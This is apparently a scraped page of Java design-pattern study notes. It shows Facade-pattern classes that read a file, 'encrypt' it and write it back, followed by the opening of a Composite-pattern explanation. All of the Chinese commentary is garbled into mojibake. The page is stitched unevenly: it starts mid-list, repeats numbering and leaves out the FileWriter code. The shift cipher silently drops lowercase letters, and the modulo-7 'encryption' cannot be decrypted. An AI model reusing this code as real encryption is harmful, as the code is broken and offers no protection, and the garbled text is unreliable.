  4. EncryptFacadeç±» : åŠ å¯†å¤–è§‚ç±», å……å½“å¤–è§‚ç±»

    package pers.huangyuhui.facade_pattern.facade_pattern_1;/** * @project: design-patterns * @description: åŠ å¯†å¤–è§‚ç±», å……å½“å¤–è§‚ç±» * @author: é»„å®‡è¾‰ * @date: 9/12/2019-9:59 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class EncryptFacade {    //ç»´æŒå¯¹å­ç³»ç»Ÿå¯¹è±¡çš„å¼•ç”¨    private FileReader fileReader;    private CipherMachine cipherMachine;    private FileWriter fileWriter;    public EncryptFacade() {        fileReader = new FileReader();        cipherMachine = new CipherMachine();        fileWriter = new FileWriter();    }    //è°ƒç”¨å­ç³»ç»Ÿå¯¹è±¡çš„ä¸šåŠ¡æ–¹æ³•    public void fileEncrypt(String fromPath, String toPath) {        var text = fileReader.read(fromPath);        System.out.println(">>>>>>>>>> : è¯»å–æ–‡ä»¶[ " + fromPath + " ]ä¸­çš„æ˜æ–‡æ•°æ® : " + text);        var encryptStr = cipherMachine.encrypt(text);        System.out.println(">>>>>>>>>> : æ˜æ–‡æ•°æ®åŠ å¯†åçš„ç»“æœ : " + encryptStr);        fileWriter.write(encryptStr, toPath);    }}

( ä¸‹è¿°ç¤ºä¾‹ç¨‹åºæ˜¯åœ¨ä¸Šè¿°ç¤ºä¾‹ç¨‹åºåŸºç¡€ä¸Šè¿›è¡Œæ”¹è¿›çš„ )

    package pers.huangyuhui.facade_pattern.facade_pattern_2;import java.io.FileInputStream;import java.io.IOException;/** * @project: design-patterns * @description: æ–‡ä»¶è¯»å–ç±», å……å½“å­ç³»ç»Ÿç±» * @author: é»„å®‡è¾‰ * @date: 9/12/2019-9:36 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class FileReader {    public String read(String path) {        var stringBuffer = new StringBuilder();        try (var fileInputStream = new FileInputStream(path)) {            var data = 0;            while ((data = fileInputStream.read()) != -1) {                stringBuffer.append((char) data); //char            }        } catch (IOException e) {            e.printStackTrace();        }        return stringBuffer.toString();    }}

  2. FileWriterç±» : æ–‡ä»¶ä¿å­˜ç±», å……å½“å­ç±»ç³»ç»Ÿç±»

  3. CipherMachineç±» : æ•°æ®åŠ å¯†ç±»(æ±‚æ¨¡è¿ç®—), å……å½“å­ç³»ç»Ÿç±»

    package pers.huangyuhui.facade_pattern.facade_pattern_2;/** * @project: design-patterns * @description: æ•°æ®åŠ å¯†ç±»(æ±‚æ¨¡è¿ç®—), å……å½“å­ç³»ç»Ÿç±» * @author: é»„å®‡è¾‰ * @date: 9/12/2019-9:42 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class CipherMachine {    public String encrypt(String text) {        var result = new StringBuilder();        for (int i = 0; i < text.length(); i++) {            var s = String.valueOf(text.charAt(i) % 7);            result.append(s);        }        return result.toString();    }}

  4. NewCipherMachineç±» : æ•°æ®åŠ å¯†ç±»(ç§»ä½è¿ç®—), å……å½“å­ç³»ç»Ÿç±»

    package pers.huangyuhui.facade_pattern.facade_pattern_2;/** * @project: design-patterns * @description: æ•°æ®åŠ å¯†ç±»(ç§»ä½è¿ç®—), å……å½“å­ç³»ç»Ÿç±» * @author: é»„å®‡è¾‰ * @date: 9/14/2019-6:59 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class NewCipherMachine {    public String encrypt(String text) {        var result = "";        var key = 10; //è®¾ç½®å¯†é’¥,ç§»ä½æ•°ä¸º10        for (int i = 0; i < text.length(); i++) {            var c = text.charAt(i);            //å°å†™å­—æ¯ç§»ä½            if (c >= 'a' && c <= 'z') {                c += key % 26;                if (c > 'z') {                    c -= 26;                }                if (c < 'a') {                    c += 26;                }            }            //å¤§å†™å­—æ¯ç§»ä½            if (c >= 'A' && c <= 'Z') {                c += key % 26;                if (c > 'Z') {                    c -= 26;                }                if (c < 'A') {                    c += 26;                }                result += c;            }        }        return result;    }}

  5. AbstractEncryptFacadeæŠ½è±¡ç±» : æ˜æ–‡åŠ å¯†æŠ½è±¡ç±», å……å½“æŠ½è±¡å¤–è§‚ç±»

    package pers.huangyuhui.facade_pattern.facade_pattern_2;/** * @project: design-patterns * @description: æ˜æ–‡åŠ å¯†æŠ½è±¡ç±», å……å½“æŠ½è±¡å¤–è§‚ç±» * @author: é»„å®‡è¾‰ * @date: 9/14/2019-6:54 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public abstract class AbstractEncryptFacade {    public abstract void fileEncrypt(String fromPath, String toPath);}

  6. EncryptFacadeç±» : åŠ å¯†å¤–è§‚ç±», å……å½“å¤–è§‚ç±»

    package pers.huangyuhui.facade_pattern.facade_pattern_2;/** * @project: design-patterns * @description: åŠ å¯†å¤–è§‚ç±», å……å½“å¤–è§‚ç±» * @author: é»„å®‡è¾‰ * @date: 9/12/2019-9:59 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class EncryptFacade extends AbstractEncryptFacade {    //ç»´æŒå¯¹å­ç³»ç»Ÿå¯¹è±¡çš„å¼•ç”¨    private FileReader fileReader;    private CipherMachine cipherMachine;    private FileWriter fileWriter;    public EncryptFacade() {        fileReader = new FileReader();        cipherMachine = new CipherMachine();        fileWriter = new FileWriter();    }    //è°ƒç”¨å­ç³»ç»Ÿå¯¹è±¡çš„ä¸šåŠ¡æ–¹æ³•    public void fileEncrypt(String fromPath, String toPath) {        var text = fileReader.read(fromPath);        System.out.println(">>>>>>>>>> : è¯»å–æ–‡ä»¶[ " + fromPath + " ]ä¸­çš„æ˜æ–‡æ•°æ® : " + text);        var encryptStr = cipherMachine.encrypt(text);        System.out.println(">>>>>>>>>> : æ˜æ–‡æ•°æ®åŠ å¯†åçš„ç»“æœ : " + encryptStr);        fileWriter.write(encryptStr, toPath);    }}

  7. NewEncryptFacadeç±» : åŠ å¯†å¤–è§‚ç±», å……å½“å¤–è§‚ç±»

    package pers.huangyuhui.facade_pattern.facade_pattern_2;/** * @project: design-patterns * @description: åŠ å¯†å¤–è§‚ç±», å……å½“å¤–è§‚ç±» * @author: é»„å®‡è¾‰ * @date: 9/14/2019-6:57 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class NewEncryptFacade extends AbstractEncryptFacade {    private FileReader reader;    private NewCipherMachine newCipherMachine;    private FileWriter writer;    public NewEncryptFacade() {        reader = new FileReader();        newCipherMachine = new NewCipherMachine();        writer = new FileWriter();    }    //è°ƒç”¨å­ç³»ç»Ÿå¯¹è±¡çš„ä¸šåŠ¡æ–¹æ³•    @Override    public void fileEncrypt(String fromPath, String toPath) {        String text = reader.read(fromPath);        System.out.println(">>>>>>>>>> : è¯»å–æ–‡ä»¶[ " + fromPath + " ]ä¸­çš„æ˜æ–‡æ•°æ® : " + text);        String encryptStr = newCipherMachine.encrypt(text);        System.out.println(">>>>>>>>>> : æ˜æ–‡æ•°æ®åŠ å¯†åçš„ç»“æœ : " + encryptStr);        writer.write(encryptStr, toPath);    }}

    package pers.huangyuhui.facade_pattern.facade_pattern_2;/** * @project: design-patterns * @description: å®¢æˆ·ç«¯æµ‹è¯•ç±» * @author: é»„å®‡è¾‰ * @date: 9/14/2019-6:05 PM * @version: 1.0 * @website: https://yubuntu0109.github.io/ */public class Client {    private static final String FROM_PATH = "src\\main\\java\\pers\\huangyuhui\\facade_pattern\\facade_pattern_2\\from.txt";    private static final String TO_PATH = "src\\main\\java\\pers\\huangyuhui\\facade_pattern\\facade_pattern_2\\to.txt";    public static void main(String[] args) {        //å–æ¨¡è¿ç®—åŠ å¯†        AbstractEncryptFacade encryptFacade = new EncryptFacade();        encryptFacade.fileEncrypt(FROM_PATH, TO_PATH);        //ç§»ä½è¿ç®—åŠ å¯†        AbstractEncryptFacade newEncryptFacade = new NewEncryptFacade();        newEncryptFacade.fileEncrypt(FROM_PATH, TO_PATH);    }}

å­¦ä¹ ç¬”è®° : Javaè®¾è®¡æ¨¡å¼ä¹‹Composite Pattern

ç»„åˆè®¾è®¡æ¨¡å¼ : ç»„åˆå¤šä¸ªå¯¹è±¡å½¢æˆæ ‘å½¢ç»“æ„ä»¥è¡¨ç¤ºå…·æœ‰éƒ¨åˆ†-æ•´ä½“å…³ç³»çš„å±‚æ¬¡ç»“æ„. ç»„åˆæ¨¡å¼è®©å®¢æˆ·ç«¯å¯ä»¥ç»Ÿä¸€å¯¹å¾…å•ä¸ªå¯¹è±¡å’Œç»„åˆå¯¹è±¡. (Composite Pattern : Compose objects into tree structures to pepresent part-whole hierarchies. Composite lets clients treat individual objects and compositions of objects uninformly.)

  • æ‰© : ç»„åˆæ¨¡å¼åˆç§°éƒ¨åˆ†-æ•´ä½“( Part-Whole )æ¨¡å¼,å±äºå¯¹è±¡ç»“æ„å‹æ¨¡å¼,å®ƒå°†å¯¹è±¡ç»„ç»‡åˆ°æ ‘å½¢ç»“æ„ä¸­,å¯ä»¥ç”¨æ¥æè¿°æ•´ä½“ä¸éƒ¨åˆ†çš„å…³ç³»

  1. Component( æŠ½è±¡æ„ä»¶ ) : å®ƒå¯ä»¥æ˜¯æ¥å£æˆ–æŠ½è±¡ç±»,ä¸ºå¶å­æ„ä»¶å’Œå®¹å™¨æ„ä»¶å¯¹è±¡å£°æ˜æ¥å£,åœ¨è¯¥è§’è‰²ä¸­å¯ä»¥åŒ…å«æ‰€æœ‰å­ç±»å…±æœ‰è¡Œä¸ºçš„å£°æ˜å’Œå®ç°. åœ¨æŠ½è±¡æ„ä»¶ä¸­å®šä¹‰äº†è®¿é—®åŠç®¡ç†å®ƒçš„å­æ„ä»¶çš„æ–¹æ³•,å¦‚å¢åŠ ,åˆ é™¤,è·å–å­æ„ä»¶ç­‰.

Composite( å®¹å™¨æ„ä»¶ ) : å®ƒåœ¨ç»„åˆç»“æ„ä¸­è¡¨ç¤ºå®¹å™¨èŠ‚ç‚¹å¯¹è±¡,å®¹å™¨ç»“ç‚¹åŒ…å«å­ç»“ç‚¹,å…¶å­ç»“ç‚¹å¯ä»¥æ˜¯å¶å­ç»“ç‚¹,ä¹Ÿå¯ä»¥æ˜¯å®¹å™¨ç»“ç‚¹,å®ƒæä¾›äº†ä¸€ä¸ªé›†åˆç”¨äºå­˜å‚¨å­ç»“ç‚¹,å®ç°äº†åœ¨æŠ½è±¡æ„ä»¶ä¸­å®šä¹‰çš„è¡Œä¸º,åŒ…æ‹¬å“ªäº›è®¿é—®åŠç®¡ç†å­æ„ä»¶çš„æ–¹æ³•,åœ¨å…¶ä¸šåŠ¡æ–¹æ³•ä¸­å¯ä»¥é€’å½’è°ƒç”¨å…¶è‡ªå­ç»“ç‚¹çš„ä¸šåŠ¡æ–¹æ³•.
  • æ‰© : ç»„åˆæ¨¡å¼çš„å…³é”®åœ¨äºå®šä¹‰äº†ä¸€ä¸ªæŠ½è±¡æ„ä»¶ç±»,å®ƒæ—¢å¯ä»¥ä»£è¡¨å¶å­,åˆå¯ä»¥ä»£è¡¨å®¹å™¨,å®¢æˆ·ç«¯é’ˆå¯¹è¯¥æŠ½è±¡æ„ä»¶ç±»è¿›è¡Œç¼–ç¨‹,æ— é¡»çŸ¥é“å®ƒåˆ°åº•è¡¨ç¤ºçš„å¶å­è¿˜æ˜¯å®¹å™¨,å¯ä»¥å¯¹å…¶è¿›è¡Œç»Ÿä¸€å¤„ç†. åŒæ—¶å®¹å™¨å¯¹è±¡ä¸æŠ½è±¡æ„ä»¶ç±»ä¹‹é—´è¿˜å»ºç«‹ä¸€ä¸ªèšåˆå…³è”å…³ç³»,åœ¨å®¹å™¨å¯¹è±¡ä¸­æ—¢å¯ä»¥åŒ…å«å¶å­,åˆå¯ä»¥åŒ…å«å®¹å™¨,ä»¥æ­¤å®ç°é€’å½’ç»„åˆ,å½¢æˆä¸€ä¸ªæ ‘å½¢ç»“æ„.
